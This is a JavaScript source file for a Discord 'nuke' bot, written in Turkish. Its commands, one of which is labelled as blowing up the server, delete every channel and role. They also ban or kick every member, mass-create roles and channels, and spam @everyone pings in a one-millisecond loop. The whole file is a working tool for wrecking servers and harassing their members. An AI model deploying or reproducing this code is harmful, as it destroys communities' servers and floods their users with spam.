const Discord = require("discord.js");
const client = global.client = new Discord.Client();
const config = require("./config.json");
const chalk = require("chalk");
const { red, greenBright, cyan, yellow } = require("chalk");

client.on("ready", () => {
    console.clear();
    console.log(chalk.red(`

    ███████╗░██╗░░░░░░░██╗███████╗░██████╗░███╗░░██╗██╗░░░██╗██╗░░██╗███████╗
    ╚════██║░██║░░██╗░░██║██╔════╝██╔═══██╗████╗░██║██║░░░██║██║░██╔╝██╔════╝
    ░░███╔═╝░╚██╗████╗██╔╝█████╗░░██║██╗██║██╔██╗██║██║░░░██║█████═╝░█████╗░░
    ██╔══╝░░░░████╔═████║░██╔══╝░░╚██████╔╝██║╚████║██║░░░██║██╔═██╗░██╔══╝░░
    ███████╗░░╚██╔╝░╚██╔╝░███████╗░╚═██╔═╝░██║░╚███║╚██████╔╝██║░╚██╗███████╗
    ╚══════╝░░░╚═╝░░░╚═╝░░╚══════╝░░░╚═╝░░░╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝

                        ${client.user.tag} is ready!
                        Prefix: ${config.PREFIX}
    `));

    console.log(`
    
____________________________________________________________________________________
|
|   ${chalk.bgRed(`${config.PREFIX}keyfi`)} - Sunucuyu patlatır!
|   
|   ${chalk.bgRed(`${config.PREFIX}kanalsil`)} - Tüm Kanalları Siler!
|   
|   ${chalk.bgRed(`${config.PREFIX}kanaloluştur`)} *miktar* - Belirlenen Sayıda Kanal Oluşturur!
|
|   ${chalk.bgRed(`${config.PREFIX}etiket`)} *kanalSayısı* *mesajSayısı* *mesaj* - Verilen miktar kadar mesaj ve kanal oluşturup etiket atar!
|   
|   ${chalk.bgRed(`${config.PREFIX}rolsil`)} - Tüm Rolleri Siler!
|   
|   ${chalk.bgRed(`${config.PREFIX}ban`)} - Tüm Kullanıcıları Banlar!
|   
|   ${chalk.bgRed(`${config.PREFIX}kick`)} - Tüm Kullanıcıları Kickler!
|   
|   ${chalk.bgRed(`${config.PREFIX}rololuştur`)} *miktar* *rolAdı* - Belirlenen Sayıda Rol Oluşturur!
|___________________________________________________________________________________

    `)


});

client.on("message", async message => {
    if(!config["HerkesKullanabilir?"]) {
        if(message.author.id != config.Owner) return;
    }

    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    let args = message.content.split(" ").slice(1);
    var args1 = args[0];
    var args2 = args.slice(1).join(' ')
    var args3 = args.slice(2).join(', ');
    
    if(message.content === `${config.PREFIX}keyfi`) {
        console.log(`${chalk.bgRed("[KEYFI]")} Sunucu Bum!`)
        
        KanalTemizle().catch((err) => {
            message.reply(err);
        });

        DelAllRoles().catch((err) => {
            message.reply(err);
        });

        MassChnPing(30, config.Default.Channel, config.Default.Mention).catch((err) => {
            message.reply(err);
        });

        MassRoles(50, config.Default.Role).catch((err) => {
            message.reply(err);
        });
    }

    if(message.content === `${config.PREFIX}kanalsil`) {
        console.log(`${chalk.bgCyan("[LOG]")} Kanallar Siliniyor!`)
        KanalTemizle().catch((err) => {
            message.reply(err);
        });
    }

    if(message.content.startsWith(`${config.PREFIX}kanaloluştur`)) {
        KanalOlustur(args1).catch((err) => {
            message.reply(err);
        });
        console.log(`${chalk.bgCyan("[LOG]")} Kanal Oluşturuluyor!`)
    }

    if(message.content.startsWith(`${config.PREFIX}etiket`)) {
        MassChnPing(args1, args2, args3).catch((err) => {
            message.reply(err);
        });
        console.log(`${chalk.bgCyan("[LOG]")} Etiket Atılıyor!`)
    }

    if(message.content.startsWith(`${config.PREFIX}rolsil`)) {
        DelAllRoles().catch((err) => {
            message.reply(err);
        });
        console.log(`${chalk.bgCyan("[LOG]")} Roller Siliniyor!`)
    }
    
    if(message.content.startsWith(`${config.PREFIX}ban`)) {
        BanAll().catch((err) => {
            message.reply(err);
        });
        console.log(`${chalk.bgCyan("[LOG]")} Kullanıcılar Banlanıyor!`)
    }
    
    if(message.content.startsWith(`${config.PREFIX}kick`)) {
        KickAll().catch((err) => {
            message.reply(err);
        });
        console.log(`${chalk.bgCyan("[LOG]")} Kullanıcılar Atılıyor!`)
    }

    if(message.content.startsWith(`${config.PREFIX}rololuştur`)) {
        MassRoles(args1, args2).catch((err) => {
            message.reply(err);
        });
        console.log(`${chalk.bgCyan("[LOG]")} Roller Oluşturuluyor!`)
    }
    
    //tüm kanalları sil
    function KanalTemizle() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("İzinler eksik: 'MANAGE_CHANNELS'");
            
            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
            resolve();
        });
    }
    // mess channel kanal oluştur
    function KanalOlustur(amount) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Bir sayı girin!");
            if (isNaN(amount)) return reject("Geçerli bir sayı girin!");
            if (amount > 500) return reject("500'den az bir sayı girin!");
            if (!channelPerms) return reject("İzinler Eksik: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                message.guild.channels.create(config.Default.Channel, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
            }
            resolve();
        });
    }
    //ping etiket
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Geçerli bir sayı girin");
            if (isNaN(amount)) return reject("Geçerli bir sayı girin");
            if (amount > 500) return reject("500'den fazla sayı giremezsin");
            if (!channelPerms) return reject("İzinler eksik: 'MANAGE_CHANNELS'");
            //if (!pingMessage) return reject("Etiket mesajını girin!");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if(!pingMessage) {
                    pingMessage = config.Default.Mention
                }
                if (!channelName) {
                    message.guild.channels.create(config.Default.Channel, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + config.Default.Mention);
                        }, 1);
                    });
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) }).then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1); // literally not possible but lol?
                    });
                }
            }
            resolve();
        });
    }

    //rol oluştur
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Sayı girin!");
            if (isNaN(amount)) return reject("Geçerli sayı girin!");
            if (!rolePerms) return reject("İzinler Eksik: 'MANAGE_ROLES'");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                if (!roleName) {
                    message.guild.roles.create({ name: config.Default.Role, color: "RANDOM", position: i++ }).catch((err) => {  })
                } else {
                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => {  })
                }
            }
        })
    }

    //tümrolleri sil
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("İzinler Eksik: 'MANAGE_ROLES'");
            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => {  }))
        });
    }

    //herkesi banla
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("İzinler Eksik: 'BAN_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply(`${arrayOfIDs.length} kullanıcı bulundu!`).then((msg) => {
                setTimeout(() => {
                    msg.edit("Yasaklanıyor...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.ban().catch((err) => { console.log(chalk.red("HATA: " + err)) }).then(() => { console.log(chalk.greenBright(`${member.user.tag} sunucudan yasaklandı!`)) });
                    }
                }, 2000);
            })
        })
    }

    /**
     * herkesi kickle
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("İzinler Eksik: 'KICK_MEMBERS'");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply(`${arrayOfIDs.length} kullanıcı bulundu!`).then((msg) => {
                setTimeout(() => {
                    msg.edit("Sunucudan Atılıyor!");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const user = arrayOfIDs[i];
                        const member = message.guild.members.cache.get(user);
                        member.kick().catch((err) => { console.log(chalk.red("Hata: " + err)) }).then(() => { console.log(chalk.greenBright(`${member.user.tag} sunucudan atıldı!`)) });
                    }
                }, 2000);
            })
        })
    }
})

client.on("error", e => {})

process.on("uncaughtException", err => {
    const errorMsg = err.stack.replace(new RegExp(`${__dirname}/`, "g"), "./");
    process.exit(1);}
);

process.on("unhandledRejection", err => {
	return;
});

client.login(config.TOKEN)
